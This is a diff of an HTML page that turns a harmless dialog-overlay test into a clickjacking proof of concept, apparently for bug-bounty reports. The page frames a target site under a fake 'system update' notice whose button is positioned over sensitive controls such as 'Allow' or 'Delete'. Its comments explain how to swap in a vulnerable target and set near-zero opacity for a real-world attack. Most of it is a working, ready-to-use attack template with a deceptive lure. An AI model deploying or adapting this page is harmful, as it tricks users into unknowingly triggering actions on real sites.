@@ -1,119 +1,90 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uji Lintas Peramban: Manipulasi Lapisan DOM</title>
+    <title>Proof of Concept: Clickjacking / UI Redressing Validation</title>
     <style>
         body {
-            font-family: system-ui, -apple-system, sans-serif;
-            padding: 30px;
-            background-color: #f5f5f5;
+            font-family: Arial, sans-serif;
+            margin: 30px;
         }
 
-        /* Elemen Target Utama di Latar Belakang */
-        .area-sensitif {
-            padding: 30px;
-            background-color: #ffcccc;
-            border: 3px dashed #cc0000;
-            text-align: center;
-            border-radius: 8px;
-            margin-bottom: 20px;
+        /* 1. KANVAS UTAMA: Tempat bertumpuknya halaman target dan umpan */
+        .canvas-uji {
+            position: relative;
+            width: 700px;
+            height: 500px;
+            border: 2px solid #333;
         }
 
-        .tombol-target {
+        /* 2. LAPISAN BAWAH: Halaman internal Opera / Web Target */
+        iframe#targetFrame {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+            
+            /* TIPS AUDIT: 
+               - Set ke '0.5' saat merekam video PoC agar tim triase melihat tombol asli di bawahnya.
+               - Set ke '0.001' (hampir tidak terlihat) untuk membuktikan serangan di dunia nyata. */
+            opacity: 0.5; 
+        }
+
+        /* 3. LAPISAN ATAS: Antarmuka palsu yang dilihat oleh korban */
+        .umpan-visual {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            
+            /* PENTING: Mengizinkan klik menembus lapisan HTML ini dan mengenai iframe */
+            pointer-events: none; 
+            
+            background-color: #ffffff;
+            padding: 30px;
+            box-sizing: border-box;
+        }
+
+        /* Tombol Palsu untuk memancing jari/kursor korban */
+        .tombol-palsu {
+            /* KOORDINAT: Sesuaikan 'margin' di bawah agar posisi tombol hijau ini 
+               pas di atas tombol sensitif (misal: tombol 'Allow' atau 'Delete') di dalam iframe */
+            margin-top: 150px; 
+            margin-left: 200px;
+            
             padding: 15px 30px;
-            background-color: #d9534f;
+            background-color: #28a745;
             color: white;
-            border: none;
             font-size: 16px;
             font-weight: bold;
-            cursor: pointer;
-            border-radius: 4px;
-        }
-
-        /* Elemen Penguji Tumpang Tindih (Dialog) */
-        dialog#modalUji {
-            width: 80%;
-            max-width: 400px;
-            padding: 25px;
-            border: 2px solid #333;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            
-            /* TITIK UJI 1: Manipulasi pointer agar klik menembus lapisan */
-            pointer-events: auto; 
-        }
-
-        /* TITIK UJI 2: Penanganan Backdrop Lintas Mesin */
-        dialog#modalUji::backdrop {
-            /* Menguji apakah mesin peramban mengizinkan transparansi total */
-            background-color: rgba(0, 0, 0, 0.1);
-            
-            /* Menguji dukungan filter blur (Sering bermasalah di WebKit/Safari versi lama) */
-            backdrop-filter: blur(1px);
-            -webkit-backdrop-filter: blur(1px);
-        }
-
-        .kontrol-panel {
-            margin-top: 20px;
-            padding: 15px;
-            background: #e2e8f0;
-            border-radius: 6px;
+            border: none;
+            border-radius: 5px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
     </style>
 </head>
 <body>
 
-    <h2>Laboratorium Uji Tumpang Tindih DOM</h2>
-    
-    <!-- Area Latar Belakang -->
-    <div class="area-sensitif">
-        <p><strong>Konteks Sensitif:</strong> Tombol di bawah ini memicu aksi penting.</p>
-        <button class="tombol-target" onclick="catatKlik()">[ KLIK DI SINI ]</button>
-    </div>
+    <h2>Alat Uji Validasi Kerentanan UI Frame</h2>
+    <p>Gunakan lab mandiri ini untuk membuktikan apakah komponen target dapat dibingkai (framed) tanpa proteksi anti-clickjacking.</p>
 
-    <button onclick="bukaModal()">1. Picu Elemen Tumpang Tindih</button>
+    <div class="canvas-uji">
+        <!-- MASUKKAN TARGET DI SINI:
+             Ganti src dengan URL sensitif Opera atau domain target yang Anda temukan rentan -->
+        <iframe id="targetFrame" src="https://example.com"></iframe>
 
-    <!-- Modal Target -->
-    <dialog id="modalUji">
-        <h3>Lapisan Atas Aktif</h3>
-        <p>Periksa apakah peramban Anda mengizinkan klik menembus area transparan di sekitar kotak ini ke tombol merah di belakang.</p>
-        
-        <div class="kontrol-panel">
-            <button onclick="ubahPointerEvents('none')">Set pointer-events: none</button>
-            <button onclick="ubahPointerEvents('auto')">Set pointer-events: auto</button>
+        <!-- Lapisan Rekayasa Sosial Visual -->
+        <div class="umpan-visual">
+            <h3>Pemberitahuan Pembaruan Sistem</h3>
+            <p>Aplikasi Anda memerlukan pembaruan optimasi ruang penyimpanan. Silakan klik tombol di bawah untuk melanjutkan:</p>
+            
+            <button class="tombol-palsu">OPTIMALKAN SEKARANG</button>
         </div>
-        <br>
-        <button onclick="tutupModal()">2. Tutup Lapisan</button>
-    </dialog>
-
-    <p id="logAksi" style="color: blue; font-weight: bold; margin-top: 20px;"></p>
-
-    <script>
-        const modal = document.getElementById('modalUji');
-        const log = document.getElementById('logAksi');
-
-        function bukaModal() {
-            modal.showModal();
-            log.innerText = "Sistem: Elemen <dialog> terbuka menggunakan .showModal()";
-        }
-
-        function tutupModal() {
-            modal.close();
-            log.innerText = "Sistem: Elemen <dialog> ditutup.";
-        }
-
-        function catatKlik() {
-            log.innerText = "AWAS: Tombol latar belakang berhasil diklik! (Click-through Terjadi)";
-            log.style.color = "red";
-        }
-
-        function ubahPointerEvents(nilai) {
-            modal.style.pointerEvents = nilai;
-            log.innerText = `Gaya diubah: pointer-events = ${nilai}`;
-        }
-    </script>
+    </div>
 
 </body>
 </html>
